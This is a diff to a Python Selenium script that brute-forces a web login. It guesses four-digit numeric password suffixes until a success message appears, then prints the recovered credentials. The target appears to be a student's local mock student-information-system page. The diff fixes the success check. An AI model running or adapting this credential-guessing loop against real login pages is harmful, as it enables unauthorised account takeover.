@@ -34,7 +34,7 @@ username.send_keys(name)#inputs the username inputed earlier
 password = browser.find_element_by_id("txtPassword") #sets focus on the password text input box
 
 #Login message, get the element that holds the message if the login is successful
-isLogin = browser.find_element_by_id("is-login")
+isLogin = browser.find_element_by_id("is-login").text
 
 #Brute Force Iterations
 while isLogin != "Login successful":#attempts different passwords until a login is found via change in url
@@ -45,10 +45,11 @@ while isLogin != "Login successful":#attempts different passwords until a login 
     print (str(numToUse).zfill(4))#prints the current password attempt for troubleshooting and to look like one of those cool movie hackers
     numToUse = int(numToUse) + 1 #goes to the next password
     time.sleep(1)#delay to allow tyler sis to process the login information submitted
+    isLogin = browser.find_element_by_id("is-login").text
 
 print("The username is: " + name)#prints the username inputed earlier
 print("The password is: " + base + (str(numToUse-1).zfill(4)))#prints the correct password for the user inputed
 
 #Close browser is unsuccessful
-if browser.current_url == ('file:///C:/Users/ncampbell282/Documents/GitHub/STASoftDevEEP/sis_main/sis_Web/login-page.html'):
+if isLogin != "Login successful":
     browser.close()
